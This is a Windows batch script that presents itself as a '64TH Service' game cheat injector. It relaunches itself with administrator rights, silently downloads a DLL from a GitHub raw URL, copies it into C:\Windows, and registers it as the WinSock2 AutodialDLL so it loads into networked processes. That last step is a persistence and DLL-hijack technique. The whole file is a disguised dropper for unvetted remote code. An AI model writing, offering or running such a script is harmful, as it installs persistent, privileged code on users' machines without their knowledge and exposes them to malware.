@echo off
setlocal enabledelayedexpansion

:: Set console text color to green (Dark Green: 02, Bright Green: 0A)
color 0A

:: Check for administrative privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo This script requires administrative privileges. Restarting with admin rights...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs"
    exit /b
)

:: Display header
echo.
echo  ==============================
echo  =        [32m64TH Service[0m        =
echo  ==============================
echo.

:: Create a temporary folder in the user's temp directory
set "tempFolder=%temp%\64THService"
mkdir "!tempFolder!" 2>nul

:: Download required files
echo.
echo [32mLoading...[0m
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/topking91154/cheat/raw/refs/heads/main/diddy.dll' -OutFile '!tempFolder!\diddy.dll'" >nul 2>&1

:: Move the downloaded file to the final destination and modify registry
echo.
echo [32mInjecting cheat...[0m
timeout /t 5 >nul
move /Y "!tempFolder!\diddy.dll" "C:\Windows\" >nul 2>&1
reg add "HKLM\SYSTEM\ControlSet001\Services\WinSock2\Parameters" /t REG_SZ /v AutodialDLL /d "%systemroot%\diddy.dll" /F >nul 2>&1

echo.
echo [32mOperation completed successfully.[0m

echo.
echo [32mPress any key to exit...[0m
pause >nul

:end
